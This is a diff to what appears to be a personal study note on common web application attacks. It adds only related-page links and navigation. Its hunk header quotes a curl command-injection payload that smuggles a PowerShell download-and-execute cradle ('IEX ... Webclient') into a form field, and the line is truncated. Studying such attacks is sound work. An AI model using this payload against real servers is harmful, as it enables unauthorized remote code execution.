@@ -362,3 +362,15 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 > and the implementation of the web application, as well as any security mechanisms in
 > place.
 > ```
+
+---
+%% graph-links %%
+## Related
+- [[Local file inclusion (LFI)]]
+- [[PHP wrappers]]
+- [[Using executable files]]
+- [[Enumerating and Abusing APIs]]
+
+> [!info] Navigation
+> Section: [[Web Applications/Common Web Application Attacks/_index|Common Web Application Attacks]] · Home: [[🏠 Home]]
+
